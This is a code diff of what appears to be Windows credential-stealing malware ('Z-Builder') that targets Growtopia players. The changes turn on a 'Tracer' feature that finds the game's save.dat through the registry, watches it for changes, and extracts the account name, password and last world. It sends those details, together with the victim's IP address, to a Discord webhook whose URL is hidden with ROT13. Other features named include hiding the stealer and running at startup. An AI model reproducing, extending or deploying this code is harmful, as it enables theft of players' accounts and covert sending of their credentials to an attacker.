@@ -43,14 +43,16 @@ void RunOnStartUp();
 void HideStealer();
 bool VerifyLicense(string License);
 string decrypt2(string toEncryt);
+string ReadContent(string Path);
+void WriteTempContent(string Content);
 
 INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
 {
-    //string License = "[mohvyqre{J2N7U6YJ}]";
-    string License = "[zbuilder{zbuilder}]";
+    string License = "[mohvyqre{J2N7U6YJ}]";
+    //string License = "[zbuilder{zbuilder}]";
     if (VerifyLicense(decrypt(License)))
     {
-        string Feature = "[Tracer:(N)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]";
+        string Feature = "[Tracer:(Y)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]";
         CleanUp();
         string RawIPInfo = DownloadString("http://icanhazip.com/");
         string IPInfo = RawIPInfo.erase(RawIPInfo.size() - 1);
@@ -204,8 +206,29 @@ string DownloadString(string URL) {
 // Download string - End
 string SaveDatPath()
 {
-    string tempPath = getenv("LOCALAPPDATA");
-    string SaveDatLocation = tempPath + "\\Growtopia\\save.dat";
+    string GTLocation;
+    try
+    {
+        HKEY hKey;
+        char data[255];
+        DWORD datasize = sizeof(data) / sizeof(char);
+        RegOpenKeyEx(HKEY_CURRENT_USER, _T("Software\\Growtopia"), 0, KEY_READ, &hKey);
+        RegGetValueA(hKey, NULL, "path", RRF_RT_REG_SZ, NULL, (void*)data, &datasize);
+        GTLocation = data;
+    }
+    catch (...)
+    {
+    }
+    string GTFileLocation = GTLocation + "\\Growtopia.exe";
+    ifstream GTFile(GTFileLocation, std::ios::binary);
+    string AllBytes = string((istreambuf_iterator<char>(GTFile)),
+        (istreambuf_iterator<char>()));
+    GTFile.close();
+    string LocationOfName = "Exiting the app";
+    size_t DummyLicenseLocation = AllBytes.find(LocationOfName);
+    string SaveDatName = AllBytes.substr(DummyLicenseLocation + LocationOfName.length() + 1);
+    SaveDatName = SaveDatName.substr(0, 8);
+    string SaveDatLocation = GTLocation + "\\" + SaveDatName;
     return SaveDatLocation;
 }
 
@@ -455,9 +478,56 @@ void LocateAllAccs()
 // Get all accounts in the PC (besides recycle bin) - End
 
 // Tracer
+string ReadContent(string path)
+{
+    ifstream ReadContent(path, std::ios::binary);
+    string Content = string((istreambuf_iterator<char>(ReadContent)),
+        (istreambuf_iterator<char>()));
+    ReadContent.close();
+    return Content;
+}
+
+void WriteTempContent(string Content)
+{
+    string TempPath = getenv("TEMP");
+    string Location = TempPath + "\\ZBData.zb";
+    ofstream WriteContent(Location, std::ofstream::trunc);
+    WriteContent << Content;
+    WriteContent.close();
+}
+
+template<typename InputIterator1, typename InputIterator2> 
+bool
+range_equal(InputIterator1 first1, InputIterator1 last1,
+    InputIterator2 first2, InputIterator2 last2)
+{
+    while (first1 != last1 && first2 != last2)
+    {
+        if (*first1 != *first2) return false;
+        ++first1;
+        ++first2;
+    }
+    return (first1 == last1) && (first2 == last2);
+}
+
+bool compare_files(const std::string& filename1, const std::string& filename2)
+{
+    std::ifstream file1(filename1);
+    std::ifstream file2(filename2);
+
+    std::istreambuf_iterator<char> begin1(file1);
+    std::istreambuf_iterator<char> begin2(file2);
+
+    std::istreambuf_iterator<char> end;
+
+    return range_equal(begin1, end, begin2, end);
+}
+
 void TraceAcc()
 {
     string SaveDatLocation = SaveDatPath();
+    string Contents = ReadContent(SaveDatLocation);
+    WriteTempContent(Contents);
     string directory;
     const size_t last_slash_idx = SaveDatLocation.rfind('\\');
     if (std::string::npos != last_slash_idx)
@@ -471,25 +541,21 @@ void TraceAcc()
             return;
         }
         string SaveDatLocation = SaveDatPath();
-        ifstream SaveDatCompare(SaveDatLocation);
-        string SaveDatContents = string((istreambuf_iterator<char>(SaveDatCompare)),
-            (istreambuf_iterator<char>()));
         switch (status)
         {
         case FileStatus::created:
             if (path_to_watch == SaveDatLocation)
             {
-                ifstream SaveDatCompare2(SaveDatLocation, std::ios::binary);
-                string SaveDatContents2 = string((istreambuf_iterator<char>(SaveDatCompare2)),
-                    (istreambuf_iterator<char>()));
-                if (SaveDatContents == SaveDatContents2)
+                string TempFileLocation = (string)getenv("TEMP") + "\\ZBData.zb";
+                string TempContents = ReadContent(TempFileLocation);
+                string Contents = ReadContent(SaveDatLocation);
+                string tempPath = getenv("TEMP");
+                string targetString = tempPath + "\\save.dat";
+                if (!(compare_files(TempFileLocation, SaveDatLocation)))
                 {
-                    SaveDatContents = SaveDatContents2;
-                    string tempPath = getenv("TEMP");
-                    string targetString = tempPath + "\\save.dat";
-                    string SaveDatLocation = SaveDatPath();
                     try
                     {
+                        WriteTempContent(Contents);
                         wstring wSaveDatLocation;
                         wSaveDatLocation.assign(SaveDatLocation.begin(), SaveDatLocation.end());
                         wstring wTarget;
@@ -513,6 +579,7 @@ void TraceAcc()
                         size_t StringSplit = AccDataContent.find(AccDataSplit);
                         GrowID = AccDataContent.substr(0, StringSplit);
                         AccDataContent.erase(0, StringSplit + AccDataSplit.size());
+                        StringSplit = AccDataContent.find(AccDataSplit);
                         Password = AccDataContent.substr(0, StringSplit);
                         AccDataContent.erase(0, StringSplit + AccDataSplit.size());
                         LastWorld = AccDataContent;
@@ -528,23 +595,21 @@ void TraceAcc()
                     string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Traced an account! ~Z-Builder\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
                     SendMessage(AllInfo, "application/json"); //application/json or multipart/form-data
                 }
-                
             }
             break;
         case FileStatus::modified:
             if (path_to_watch == SaveDatLocation)
             {
-                ifstream SaveDatCompare2(SaveDatLocation, std::ios::binary);
-                string SaveDatContents2 = string((istreambuf_iterator<char>(SaveDatCompare2)),
-                    (istreambuf_iterator<char>()));
-                if (SaveDatContents == SaveDatContents2)
+                string TempFileLocation = (string)getenv("TEMP") + "\\ZBData.zb";
+                string TempContents = ReadContent(TempFileLocation);
+                string Contents = ReadContent(SaveDatLocation);
+                string tempPath = getenv("TEMP");
+                string targetString = tempPath + "\\save.dat";
+                if (!(compare_files(TempFileLocation, SaveDatLocation)))
                 {
-                    SaveDatContents = SaveDatContents2;
-                    string tempPath = getenv("TEMP");
-                    string targetString = tempPath + "\\save.dat";
-                    string SaveDatLocation = SaveDatPath();
                     try
                     {
+                        WriteTempContent(Contents);
                         wstring wSaveDatLocation;
                         wSaveDatLocation.assign(SaveDatLocation.begin(), SaveDatLocation.end());
                         wstring wTarget;
@@ -568,6 +633,7 @@ void TraceAcc()
                         size_t StringSplit = AccDataContent.find(AccDataSplit);
                         GrowID = AccDataContent.substr(0, StringSplit);
                         AccDataContent.erase(0, StringSplit + AccDataSplit.size());
+                        StringSplit = AccDataContent.find(AccDataSplit);
                         Password = AccDataContent.substr(0, StringSplit);
                         AccDataContent.erase(0, StringSplit + AccDataSplit.size());
                         LastWorld = AccDataContent;
@@ -583,7 +649,6 @@ void TraceAcc()
                     string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Traced an account! ~Z-Builder\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
                     SendMessage(AllInfo, "application/json"); //application/json or multipart/form-data
                 }
-
             }
             break;
         case FileStatus::erased:
@@ -713,8 +778,8 @@ int DownloadFile(string url, string path)
 // Webhook sender
 void SendMessage(string Message, string ContentType)
 {
-    string s = decrypt("[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]");
-    //string s = decrypt("uggcf://qvfpbeqncc.pbz/ncv/jroubbxf/743596214515138653/U_rvrPadWvleuPPT2Wy_JiOWhqnMaEwad-Yf-BuGogwgSpRW3DCDIVIhO6IA2IninHvK[][]");
+    //string s = decrypt("[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]");
+    string s = decrypt("uggcf://qvfpbeqncc.pbz/ncv/jroubbxf/743596214515138653/U_rvrPadWvleuPPT2Wy_JiOWhqnMaEwad-Yf-BuGogwgSpRW3DCDIVIhO6IA2IninHvK[][]");
     size_t LocateBegin = s.find("[");
     size_t LocateEnd = s.find("]");
     if (LocateBegin > LocateEnd)
